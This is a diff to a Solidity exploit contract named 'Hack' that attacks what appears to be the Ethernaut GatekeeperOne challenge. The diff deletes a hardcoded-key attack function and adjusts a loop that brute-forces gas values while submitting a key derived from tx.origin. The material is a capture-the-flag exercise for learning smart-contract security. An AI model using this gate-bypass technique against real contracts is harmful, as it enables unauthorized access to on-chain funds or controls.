@@ -31,15 +31,12 @@ contract GatekeeperOne {
 contract Hack {
   GatekeeperOne gatekeeperOne = GatekeeperOne(0x0aB6aC3913B5c6536Cb9a0cB9E35f7F162Df4bEc);
 
-  function Attack() public {
-    bytes8 key = 0xffffffff0000ffff;
-    (bool result,) = address(gatekeeperOne).call{gas:400000}(abi.encodeWithSignature("enter(bytes8)", key));
-  }
+
 
   function open() public {
     bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
       for(uint i = 0; i < 8191 ;i++){
-        address(gatekeeperOne).call{gas:114928 + i}(abi.encodeWithSignature("enter(bytes8)", key));
+        address(gatekeeperOne).call{gas:314928 + i}(abi.encodeWithSignature("enter(bytes8)", key));
       }
   }
 }
